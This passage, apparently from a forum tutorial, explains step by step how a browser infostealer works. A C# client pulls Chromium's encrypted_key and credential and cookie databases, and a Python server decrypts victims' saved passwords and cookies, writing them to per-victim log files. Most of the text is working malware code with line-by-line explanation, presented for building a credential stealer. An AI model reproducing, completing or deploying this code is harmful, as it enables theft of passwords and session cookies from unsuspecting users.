...
Now I will explain how exactly the password from the database will be decrypted:
...
C#:Copy to clipboard
dynamic json = JObject.Parse(localStateData);
Converts the contents of a file to json
C#:Copy to clipboard
string encryptedKeyBase64 = json.os_crypt.encrypted_key;
Looks for the key by encrypted_key
C#:Copy to clipboard
byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64);
...
Python:Copy to clipboard
cursor.execute("SELECT password_value FROM logins")
Running a query against the logins table and inside it against the password_value column
Python:Copy to clipboard
master_key_base64
...
C#:Copy to clipboard
dynamic json = JObject.Parse(localStateData);
Looking for a key in the content
C#:Copy to clipboard
string encryptedKeyBase64 = json.os_crypt.encrypted_key;
...
Found files are converted to base64 and then added to the browser's json object
C#:Copy to clipboard
...
Since all this code is in a foreach loop, this code will be repeated over and over again until the entire list of paths in the dictionary is exhausted.
...
unique_id_logs_dir = os.path.join(app.root_path, 'logs', unique_id)
os.makedirs(unique_id_logs_dir, exist_ok=True)
Creating a directory in which logs will be stored. Each client's log folder will be named after its unique ID
Python:Copy to clipboard
passwords_file_path = os.path.join(unique_id_logs_dir, 'passwords.txt')
Path to the file in which passwords will be written
Python:Copy to clipboard
key_base64 = browser_data.get("key")
if key_base64 is None:
    print(f'В браузере {browser_name} отсутствует ключ.')
    continue
Obtaining a key in base64 format from data received from the client
Python:Copy to clipboard
key = base64.b64decode(key_base64)
...
if (param_name == "login_data"):
    ...
    cursor = connection.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
If the JSON contains the login_data parameter, then a connection to this database occurs
Python:Copy to clipboard
origin_url = row[0]
username_value = row[1]
encrypted_password = row[2]
These rows are responsible for retrieving data from the columns
Python:Copy to clipboard
decrypted_password = decrypt_password(encrypted_password, key)
The decrypt_password function is called, to which the encrypted password and the key that was previously decoded from base64 are passed.
Python:Copy to clipboard
passwords_file.write(f'Browser: {browser_name}\n')
passwords_file.write(f'Origin URL: {origin_url}\n')
passwords_file.write(f'Username: {username_value}\n')
passwords_file.write(f'Password: {decrypted_password}\n')
Writing data from database columns to a previously created text file for passwords, and the decrypted password itself.
Python:Copy to clipboard
elif param_name == "cookies":
    ...
    process_cookies(decoded_data, key, cookies_file_path)
    print(f"Файл {db_name} успешно сохранен и cookies расшифрованы.")
In this code, it first checks whether the JSON contains the cookies parameter; if it exists, then the path to save the file is formed.
Python:Copy to clipboard
process_cookies(decoded_data, key, cookies_file_path)
The process_cookie function is called, to which the key, decoded cookie data and the path to the file in which the cookies will be written are passed.
